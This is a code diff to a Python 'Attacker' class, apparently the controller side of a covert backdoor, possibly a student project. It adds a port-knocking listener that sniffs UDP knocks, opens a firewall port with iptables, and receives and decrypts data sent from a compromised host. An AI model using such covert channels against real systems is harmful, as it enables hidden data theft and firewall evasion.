@@ -44,6 +44,10 @@ class Attacker(object):
         send_command_thread.setDaemon(True)
         send_command_thread.start()
 
+        listen_thread = threading.Thread(target=self.listen)
+        listen_thread.setDaemon(True)
+        listen_thread.start()
+
         knock_listener_thread = threading.Thread(target=self.knockListener)
         knock_listener_thread.setDaemon(True)
         knock_listener_thread.start()
@@ -79,37 +83,33 @@ class Attacker(object):
         mFilter = "udp and src host " + self.remoteIP + " and src port " + str(self.remotePort)
         while self.state != 3:
             sniff(filter=mFilter, prn=self.knockReceive, count=1)
-        while self.state == 3:
-            self.listen()
+        self.state = 0
 
     def knockReceive(self, packet):
         if packet.haslayer(UDP):
-            print(self.knockList)
             port = packet[UDP].dport
             if port == self.knockList[0] and self.state == 0:
                 self.state = 1
-                print("Knock %d" % self.state)
             elif port == self.knockList[1] and self.state == 1:
                 self.state = 2
-                print("Knock %d" % self.state)
             elif port == self.knockList[2] and self.state == 2:
                 self.state = 3
-                print("Knock %d...Openning port for receiving" % self.state)
+                print("Knocking successfully...Openning port for receiving" % self.state)
                 self.acceptRequest()
             else:
-                print("Incorrect knock sequence...Reset")
                 self.state = 0
 
     def acceptRequest(self):
         iptablesManager.run(self.protocol, self.remoteIP, str(self.listenPort), self.ttl)
 
         sock = helpers.createSocket()
-        sock.bind((host, port))
+        port = self.listenPort
+        sock.bind((self.localIP, port))
 
         sock.listen(1)
         print("Ready to receive on port %d..." % port)
         conn, addr = sock.accept()
-        print("Receive connection from %s" % addr)
+        print("Receive connection from {}".format(addr))
 
         dummyFile = "received_data.txt"
         with open(dummyFile, 'wb') as receivedData:
@@ -125,7 +125,6 @@ class Attacker(object):
         conn.close()
         encryption.decryptFile(dummyFile)
         os.remove(dummyFile)
-        self.state = 0
         print("Done receiving!")
 
 
@@ -134,8 +133,6 @@ class Attacker(object):
                 str(self.localPort) + " and src host " + self.remoteIP
         print("Filter: %s" % mFilter)
         sniff(lfilter=self.isIncoming, filter=mFilter, prn=self.parsePacket)
-
-
 
     def parsePacket(self, packet):
         """
